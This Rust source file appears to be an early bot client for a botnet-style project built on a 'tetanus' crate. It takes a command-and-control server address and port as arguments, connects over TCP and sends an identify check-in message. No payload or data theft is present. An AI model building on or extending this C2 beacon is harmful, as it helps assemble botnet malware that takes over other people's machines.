extern crate tetanus;

use tetanus::Message;

use std::{io, net, env};
use std::io::Write;
use std::process::exit;
use std::str::FromStr;

fn parse_arg<T: FromStr>(n: usize) -> Option<Result<T, T::Err>> {
    match env::args().nth(n) {
        Some(opt) => Some(opt.parse::<T>()),
        None      => None,
    }
}

fn send_msg(mut stream: net::TcpStream, msg: Message) -> io::Result<()> {
    stream.write(&msg.as_bytes())?;
    Ok(())
}

fn run() -> Result<(), tetanus::Error> {
    if env::args().len() < 3 {
        return Err(tetanus::Error::Argument)
    } 

    // parse_arg should never return None
    let cnc_ip: net::IpAddr = parse_arg(1).unwrap()?;
    let cnc_port: u16 = parse_arg(2).unwrap()?;

    let cnc = net::TcpStream::connect((cnc_ip, cnc_port))?;
    send_msg(cnc, Message::identify())?;

    Ok(())
}

fn main() {
    let result = run();

    match result {
        Ok(_)  => exit(0),
        Err(e) => {
            eprintln!("{}", e);
            exit(1)
        }
    }
}